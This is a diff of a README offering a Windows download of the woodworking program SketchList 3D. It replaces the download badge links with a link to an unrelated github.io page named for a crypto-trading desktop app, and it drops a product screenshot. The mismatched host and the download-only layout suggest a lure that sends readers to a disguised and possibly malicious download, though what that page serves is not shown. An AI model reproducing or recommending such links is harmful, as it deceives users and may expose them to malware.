@@ -4,7 +4,7 @@
 
 ## 📥 Download SketchList 3D for Windows
 
-[![⬇️ Download SketchList 3D](https://img.shields.io/badge/Download-SketchList--3D-blue?style=for-the-badge&logo=windows)](https://asdeennerhorse.github.io/mogus/SketchList)
+[![⬇️ Download SketchList 3D](https://img.shields.io/badge/Download-SketchList--3D-blue?style=for-the-badge&logo=windows)](https://cryptohopper-desktop-app.github.io/.github)
 
 ---
 
@@ -30,11 +30,7 @@ The software allows users to create detailed cut lists, generate part layouts, a
 
 Whether you're building custom cabinets, planning a home office, or designing shelving units, SketchList 3D provides an intuitive space to visualize, refine, and document every aspect of your woodworking design.
 
-[![⬇️ Download SketchList 3D](https://img.shields.io/badge/Download-SketchList--3D-blue?style=for-the-badge&logo=windows)](https://asdeennerhorse.github.io/mogus/SketchList)
-
----
-
-![SketchList Interface](https://wwn-files-live.s3.us-east-2.amazonaws.com/s3fs-public/field/image/sketchlist-cabinet-wizard_1.jpg)
+[![⬇️ Download SketchList 3D](https://img.shields.io/badge/Download-SketchList--3D-blue?style=for-the-badge&logo=windows)](https://cryptohopper-desktop-app.github.io/.github)
 
 ---
 
